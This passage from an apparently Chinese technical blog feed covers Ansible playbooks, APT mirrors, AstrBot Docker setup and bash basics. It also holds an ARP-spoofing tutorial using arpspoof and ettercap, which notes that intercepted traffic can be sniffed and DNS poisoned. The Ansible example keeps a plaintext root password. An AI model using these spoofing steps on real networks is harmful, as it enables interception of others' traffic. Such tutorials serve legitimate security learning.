<p>安装 EPEL 仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install epel-release -y</span><br></pre></td></tr></table></figure>
<p>安装 Ansible</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install ansible -y</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="使用">使用</h2>
<ul>
<li>使用前需要定义两个文件：<br>
一个指定需要批量执行的主机<code>hosts.ini</code>，可以随意指定名称；一个指定需要运行的命令和动作<code>command.yml</code>，虽然可以直接指定需要运行的命令，但通过该文件可以回显执行成功或失败的主机和成功或失败的动作。</li>
</ul>
<ol>
<li>hosts.ini：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hostst_g]</span><br><span class="line">此处填写ip</span><br><span class="line">[hosts_g:vars]</span><br><span class="line">ansible_ssh_user=root ##账号</span><br><span class="line">ansible_ssh_pass=123456 ##密码</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>command.yml：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- name: 在远程主机上执行任意命令  </span><br><span class="line">  hosts: all</span><br><span class="line">  gather_facts: no</span><br><span class="line">  tasks:</span><br><span class="line">      - name: 执行一个特定命令</span><br><span class="line">        command: echo &quot;你好，世界！&quot;</span><br><span class="line">        # 使用  command  模块执行简单命令，不支持管道和重定向</span><br><span class="line">      - name:  列出目录中的文件</span><br><span class="line">        command: ls /path/to/directory</span><br><span class="line">        # 列出指定目录中的所有文件</span><br><span class="line">      - name:  使用 shell 运行包含管道的命令</span><br><span class="line">        shell: echo &quot;你好，世界！&quot; | grep 你好</span><br><span class="line">        # 使用 shell 模块支持管道、变量和重定向等 shell 特性</span><br><span class="line">      - name: 使用  hell  特性运行命令</span><br><span class="line">        shell: cat /etc/passwd | grep root</span><br><span class="line">        # 通过管道过滤包含 &quot;root&quot; 的行</span><br></pre></td></tr></table></figure>
<p>可使用shell：模拟终端上所有执行的命令。</p>
<ul>
<li>使用命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ansible-playbook -i hosts.ini command.yml</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="安装ansible示例">安装ansible示例</h2>
<h3 id="文件结构">文件结构</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">project_dir/</span><br><span class="line">├── install_tomcat.yml        # Ansible 剧本</span><br><span class="line">├── hosts.ini                 # 主机信息</span><br><span class="line">└── html/                     # 本地网页目录（你已经准备好了）</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── images/</span><br><span class="line">        └── logo.png</span><br></pre></td></tr></table></figure>
<h3 id="hosts-ini-文件内容：">hosts.ini 文件内容：</h3>
<p>目标主机信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[test]</span><br><span class="line">192.168.1.101</span><br><span class="line">192.168.1.102</span><br><span class="line"></span><br><span class="line">[test:vars]</span><br><span class="line">ansible_user=root</span><br><span class="line">ansible_ssh_pass=你的密码</span><br><span class="line">ansible_python_interpreter=/usr/bin/python3</span><br></pre></td></tr></table></figure>
<h3 id="install-tomcat-yml-内容">install_tomcat.yml 内容</h3>
<p>执行的任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">- name: 在所有 test 主机上安装并配置 Tomcat</span><br><span class="line">  hosts: test</span><br><span class="line">  become: yes</span><br><span class="line">  tasks:</span><br><span class="line"></span><br><span class="line">    - name: 安装 Java（Tomcat 依赖）</span><br><span class="line">      package:</span><br><span class="line">        name: java-1.8.0-openjdk</span><br><span class="line">        state: present</span><br><span class="line"></span><br><span class="line">    - name: 创建 tomcat 用户</span><br><span class="line">      user:</span><br><span class="line">        name: tomcat</span><br><span class="line">        shell: /bin/false</span><br><span class="line">        system: yes</span><br><span class="line">        create_home: no</span><br><span class="line"></span><br><span class="line">    - name: 下载 Tomcat 安装包</span><br><span class="line">      get_url:</span><br><span class="line">        url: https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.89/bin/apache-tomcat-9.0.89.tar.gz</span><br><span class="line">        dest: /tmp/tomcat.tar.gz</span><br><span class="line"></span><br><span class="line">    - name: 创建 Tomcat 安装目录</span><br><span class="line">      file:</span><br><span class="line">        path: /opt/tomcat</span><br><span class="line">        state: directory</span><br><span class="line">        owner: tomcat</span><br><span class="line">        group: tomcat</span><br><span class="line">        mode: &#x27;0755&#x27;</span><br><span class="line"></span><br><span class="line">    - name: 解压 Tomcat 安装包</span><br><span class="line">      unarchive:</span><br><span class="line">        src: /tmp/tomcat.tar.gz</span><br><span class="line">        dest: /opt/tomcat</span><br><span class="line">        remote_src: yes</span><br><span class="line">        creates: /opt/tomcat/apache-tomcat-9.0.89</span><br><span class="line"></span><br><span class="line">    - name: 配置 Tomcat 环境变量（可选）</span><br><span class="line">      copy:</span><br><span class="line">        dest: /etc/profile.d/tomcat.sh</span><br><span class="line">        content: |</span><br><span class="line">          export CATALINA_HOME=/opt/tomcat/apache-tomcat-9.0.89</span><br><span class="line"></span><br><span class="line">    - name: 备份默认 webapps 目录</span><br><span class="line">      command: mv /opt/tomcat/apache-tomcat-9.0.89/webapps /opt/tomcat/apache-tomcat-9.0.89/webapps.bak</span><br><span class="line">      args:</span><br><span class="line">        creates: /opt/tomcat/apache-tomcat-9.0.89/webapps.bak</span><br><span class="line"></span><br><span class="line">    - name: 创建网页目录 /var/www/html</span><br><span class="line">      file:</span><br><span class="line">        path: /var/www/html</span><br><span class="line">        state: directory</span><br><span class="line">        owner: tomcat</span><br><span class="line">        group: tomcat</span><br><span class="line">        mode: &#x27;0755&#x27;</span><br><span class="line"></span><br><span class="line">    - name: 上传本地 html 文件到远程 /var/www/html</span><br><span class="line">      copy:</span><br><span class="line">        src: html/</span><br><span class="line">        dest: /var/www/html/</span><br><span class="line">        owner: tomcat</span><br><span class="line">        group: tomcat</span><br><span class="line">        mode: &#x27;0644&#x27;</span><br><span class="line"></span><br><span class="line">    - name: 创建 /var/www/html 到 Tomcat webapps 的符号链接</span><br><span class="line">      file:</span><br><span class="line">        src: /var/www/html</span><br><span class="line">        dest: /opt/tomcat/apache-tomcat-9.0.89/webapps</span><br><span class="line">        state: link</span><br><span class="line">        force: yes</span><br><span class="line"></span><br><span class="line">    - name: 启动 Tomcat 服务</span><br><span class="line">      shell: nohup /opt/tomcat/apache-tomcat-9.0.89/bin/startup.sh &amp;</span><br><span class="line">      args:</span><br><span class="line">        chdir: /opt/tomcat/apache-tomcat-9.0.89/bin</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>apt源</title>
    <url>/2025/07/13/apt%E6%BA%90/</url>
    <content><![CDATA[<h2 id="修改-APT-源">修改 APT 源</h2>
<h3 id="手动修改-sources-list">手动修改 <code>sources.list</code></h3>
<ol>
<li>
<p><strong>备份原文件</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>编辑源文件</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>替换为官方源（以 Ubuntu 22.04 为例）</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://archive.ubuntu.com/ubuntu jammy main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu jammy-updates main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu jammy-security main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu jammy-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<p>如需国内镜像，可替换为：</p>
<ul>
<li><strong>清华源</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
</li>
<li><strong>阿里云源</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<blockquote>
<p>替换完成后可以将<code>/etc/apt/sources.list.d</code>内的文件注释，可能会有其他源</p>
</blockquote>
<ol start="4">
<li><strong>更新软件列表</strong>：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt clean</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>apt源</tag>
        <tag>apt</tag>
      </tags>
  </entry>
  <entry>
    <title>arp欺骗</title>
    <url>/2024/08/01/arpspoof/</url>
    <content><![CDATA[<h2 id="使用arpspoof命令：">使用arpspoof命令：</h2>
<pre><code>arpspoof -i eth0 -t 目标IP地址 网关IP地址
</code></pre>
<p>-i interface          指定要使用的接口。<br>
-c own|host|both     	指定范围own|host|both（自己|主机|两者）<br>
-t target            指定一台特定主机进行ARP（如果未指定，则为LAN上的所有主机）<br>
-r						  两个主机(主机和目标)以捕获两个方向的流量。(仅对-t有效)<br>
host               指定您希望抓取数据包的host（通常是本地网关）</p>
<h2 id="使用ettercap-G-蜘蛛工具">使用ettercap -G 蜘蛛工具</h2>
<p>实例演示-arp欺骗</p>
<p>1.打开ettercap，选择你要使用的网卡，点击&quot;对号&quot;。<br>
<img src="/images/pasted-4.png" alt="upload successful"></p>
<p>2.点击&quot;搜索&quot;按钮，进行主机发现。<br>
<img src="/images/pasted-5.png" alt="upload successful"></p>
<p>3.点击&quot;红色方框里面的按钮&quot;，我们可以查看&quot;host list&quot;.<br>
<img src="/images/pasted-6.png" alt="upload successful"></p>
<p>4.将想要欺骗的网关和受害者分别添加到&quot;add to target 1&quot;和&quot;add to target 2&quot;。<br>
<img src="/images/pasted-7.png" alt="upload successful"></p>
<p>5.点击&quot;圆圈&quot;，选择&quot;arp poisoning spoofing&quot;。<br>
<img src="/images/pasted-8.png" alt="upload successful"></p>
<p>6.选择&quot;sniff remote connections&quot;，然后点击&quot;OK&quot;。这样就配置完成，ettercap会自动开始arp欺骗。<br>
<img src="/images/pasted-9.png" alt="upload successful"></p>
<p>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。<br>
<img src="/images/pasted-10.png" alt="upload successful"></p>
<p>攻击成功之后可以让流量经过本机一层代理，可以进行抓包，dns污染等等。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>实战演示</tag>
      </tags>
  </entry>
  <entry>
    <title>astrbot-ai接入微信和qq</title>
    <url>/2025/03/20/astrbot-ai%E6%8E%A5%E5%85%A5%E5%BE%AE%E4%BF%A1%E5%92%8Cqq/</url>
    <content><![CDATA[<h2 id="astrbot">astrbot</h2>
<p>一个易于上手的多平台聊天机器人及开发框架，官方已经有详细的部署步骤，只写一下我规避遇到的问题的部署方法</p>
<blockquote>
<p>官网：<a href="https://astrbot.app/what-is-astrbot.html">https://astrbot.app/what-is-astrbot.html</a></p>
</blockquote>
<h2 id="ai接入微信">ai接入微信</h2>
<p>docker部署</p>
<h3 id="astrbot部署">astrbot部署</h3>
<ol>
<li>拉取项目</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Soulter/AstrBot</span><br><span class="line"><span class="built_in">cd</span> AstrBot</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>运行compose</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker compose up -d</span><br></pre></td></tr></table></figure>
<blockquote>
<p>配置 Gewechat 适配器时跟着官方方法配置即可，host其实只要网络通即可，11451端口已经映射宿主机，所以直接写宿主机ip即可</p>
</blockquote>
<h3 id="部署-Gewechat">部署 Gewechat</h3>
<ol>
<li>拉取镜像</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/gewe/gewe:latest</span><br><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com/gewe/gewe gewe</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>启动</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> gewechat</span><br><span class="line">docker run -itd -v ./gewechat:/root/temp -p 2531:2531 -p 2532:2532 --privileged=<span class="literal">true</span> --name=gewe gewe /usr/sbin/initse</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个时候跟着官方走看不到容器日志，但是可以看astrbot上面的日志登陆微信</p>
</blockquote>
<h2 id="接入qq">接入qq</h2>
<ol>
<li>docker拉取镜像</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mlikiowa/napcat-docker:latest</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>启动</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-e NAPCAT_GID=$(<span class="built_in">id</span> -g) \</span><br><span class="line">-e NAPCAT_UID=$(<span class="built_in">id</span> -u) \</span><br><span class="line">-p 3000:3000 \</span><br><span class="line">-p 3001:3001 \</span><br><span class="line">-p 6099:6099 \</span><br><span class="line">--name napcat \</span><br><span class="line">--restart=always \</span><br><span class="line">mlikiowa/napcat-docker:latest \</span><br><span class="line">--network default-astrbot</span><br></pre></td></tr></table></figure>
<blockquote>
<p>network写上面astrbot使用的网络</p>
</blockquote>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>astrbot</tag>
        <tag>napcat</tag>
        <tag>Gewechat</tag>
      </tags>
  </entry>
  <entry>
    <title>bash脚本的基础</title>
    <url>/2025/06/22/bash%E8%84%9A%E6%9C%AC%E7%9A%84%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="参数和变量">参数和变量</h2>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>$0</code></td>
<td>当前脚本的名字（或调用脚本时使用的命令）</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>第1个参数</td>
</tr>
<tr>
<td><code>$2</code>…</td>
<td>第2、3、4…参数，以此类推</td>
</tr>
<tr>
<td><code>$#</code></td>
<td>脚本传递参数的<strong>个数</strong></td>
</tr>
<tr>
<td><code>$@</code></td>
<td>脚本传递的<strong>全部参数</strong>，以<strong>列表</strong>形式展开</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>脚本传递的全部参数，作为<strong>单个字符串</strong>展开</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>最近一条命令的<strong>退出状态</strong>（0 表示成功，非 0 表示失败）</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>当前脚本的<strong>进程 ID</strong></td>
</tr>
<tr>
<td><code>$!</code></td>
<td>最近一条在后台执行的命令的<strong>PID</strong></td>
</tr>
<tr>
<td><code>$_</code></td>
<td>上一条命令最后一个参数</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="比较运算符">比较运算符</h2>
<table>
<thead>
<tr>
<th>类型</th>
<th>运算符</th>
<th>意义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>数字比较</strong></td>
<td><code>-eq</code></td>
<td>等于</td>
<td><code>[ $a -eq $b ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-ne</code></td>
<td>不等于</td>
<td><code>[ $a -ne $b ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-gt</code></td>
<td>大于</td>
<td><code>[ $a -gt $b ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-ge</code></td>
<td>大于等于</td>
<td><code>[ $a -ge $b ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-lt</code></td>
<td>小于</td>
<td><code>[ $a -lt $b ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-le</code></td>
<td>小于等于</td>
<td><code>[ $a -le $b ]</code></td>
</tr>
<tr>
<td><strong>字符串比较</strong></td>
<td><code>=</code></td>
<td>相等</td>
<td><code>[ &quot;$a&quot; = &quot;$b&quot; ]</code></td>
</tr>
<tr>
<td></td>
<td><code>!=</code></td>
<td>不相等</td>
<td><code>[ &quot;$a&quot; != &quot;$b&quot; ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-z</code></td>
<td>空字符串</td>
<td><code>[ -z &quot;$a&quot; ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-n</code></td>
<td>非空字符串</td>
<td><code>[ -n &quot;$a&quot; ]</code></td>
</tr>
<tr>
<td><strong>文件检测</strong></td>
<td><code>-e</code></td>
<td>文件是否存在</td>
<td><code>[ -e /path/to/file ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-f</code></td>
<td>文件是否为普通文件</td>
<td><code>[ -f /path/to/file ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-d</code></td>
<td>文件是否为目录</td>
<td><code>[ -d /path/to/dir ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-r</code></td>
<td>文件是否可读</td>
<td><code>[ -r /path/to/file ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-w</code></td>
<td>文件是否可写</td>
<td><code>[ -w /path/to/file ]</code></td>
</tr>
<tr>
<td></td>
<td><code>-x</code></td>
<td>文件是否可执行</td>
<td><code>[ -x /path/to/file ]</code></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="控制结构">控制结构</h2>
<h3 id="if-判断结构">if 判断结构</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ 条件 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 满足条件时执行</span></span><br><span class="line"><span class="keyword">elif</span> [ 其他条件 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 满足其他条件时执行</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 否则执行</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num=5</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$num</span> -gt 3 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$num</span> 大于 3&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$num</span> -eq 3 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$num</span> 等于 3&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$num</span> 小于 3&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>其他（通用）：</p>
<ol>
<li>break：退出当前循环。</li>
<li>continue：跳过当前迭代，进入下次循环。</li>
</ol>
<h3 id="for-循环结构">for 循环结构</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;数字: <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>示例（列表）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fruits=(<span class="string">&quot;apple&quot;</span> <span class="string">&quot;banana&quot;</span> <span class="string">&quot;orange&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;fruits[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;我喜欢 <span class="variable">$fruit</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="while-循环结构">while 循环结构</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$count</span> -le 5 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;count = <span class="variable">$count</span>&quot;</span></span><br><span class="line">    ((count++))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="until-循环">until 循环</h3>
<p>和 while 相反，当条件为 false时持续执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">count=1</span><br><span class="line"><span class="keyword">until</span> [ <span class="variable">$count</span> -gt 5 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;count=<span class="variable">$count</span>&quot;</span></span><br><span class="line">    ((count++))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>用途：适合循环直到某个条件成立</p>
</blockquote>
<h3 id="select-菜单结构">select 菜单结构</h3>
<p>让脚本提供简单的菜单：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;Apple&quot;</span> <span class="string">&quot;Banana&quot;</span> <span class="string">&quot;Quit&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">        Apple) <span class="built_in">echo</span> <span class="string">&quot;你选择了苹果&quot;</span>;;</span><br><span class="line">        Banana) <span class="built_in">echo</span> <span class="string">&quot;你选择了香蕉&quot;</span>;;</span><br><span class="line">        Quit) <span class="built_in">break</span>;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;无效选择&quot;</span>;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>用途：适合脚本做简单交互</p>
</blockquote>
<h3 id="使用-getopts-做参数解析">使用 getopts 做参数解析</h3>
<p>让脚本接受参数选项，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;a:b:c&quot;</span> opt; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">        a) <span class="built_in">echo</span> <span class="string">&quot;选项 a 值：<span class="variable">$OPTARG</span>&quot;</span>;;</span><br><span class="line">        b) <span class="built_in">echo</span> <span class="string">&quot;选项 b 值：<span class="variable">$OPTARG</span>&quot;</span>;;</span><br><span class="line">        c) <span class="built_in">echo</span> <span class="string">&quot;选项 c&quot;</span>;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;无效选项&quot;</span>;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>用途：脚本参数更灵活，更标准化</p>
</blockquote>
<h3 id="case-结构">case 结构</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入一个颜色: &quot;</span> color</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$color</span> <span class="keyword">in</span></span><br><span class="line">    red)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;你喜欢红色&quot;</span>;;</span><br><span class="line">    blue)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;你喜欢蓝色&quot;</span>;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;颜色未知&quot;</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<h3 id="函数定义和调用">函数定义和调用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">my_func</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;这是一个函数&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用</span></span><br><span class="line">my_func</span><br></pre></td></tr></table></figure>
<p><code>用途：封装代码片段、结构化脚本</code></p>
<h3 id="脚本退出和错误检测">脚本退出和错误检测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span> 0           <span class="comment"># 正常退出</span></span><br><span class="line"><span class="built_in">exit</span> 1           <span class="comment"># 错误退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查命令是否成功</span></span><br><span class="line"><span class="keyword">if</span> ! command_here; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;命令执行失败&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="重定向和管道">重定向和管道</h3>
<ul>
<li>
<p>重定向：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command &gt; file.txt           # 覆盖</span><br><span class="line">command &gt;&gt; file.txt          # 追加</span><br><span class="line">command 2&gt; error.txt         # 错误重定向</span><br><span class="line">command &gt; all.txt 2&gt;&amp;1       # 标准和错误全部重定向</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>管道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux | grep bash           # 将 ps 的结果传递给 grep</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="脚本参数处理">脚本参数处理</h3>
<ul>
<li>
<p>检查是否提供参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;param1&gt; [param2...]&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;参数: <span class="variable">$arg</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="错误检测和脚本退出控制">错误检测和脚本退出控制</h2>
<h3 id="检查命令是否存在">检查命令是否存在</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ! <span class="built_in">command</span> -v curl &amp;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;curl 未安装，请先安装！&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="检查命令是否成功">检查命令是否成功</h3>
<p>每个命令执行完都有一个<strong>退出状态</strong>：</p>
<ul>
<li><code>0</code> 表示成功。</li>
<li>非 <code>0</code> 表示失败。</li>
</ul>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mydir</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;mkdir 执行失败！&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="检查脚本参数是否完整">检查脚本参数是否完整</h3>
<p>在脚本一开始检查参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;用法: <span class="variable">$0</span> &lt;参数1&gt; [参数2...]&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="检查命令是否存在-2">检查命令是否存在</h3>
<p>检查某命令是否已安装：</p>
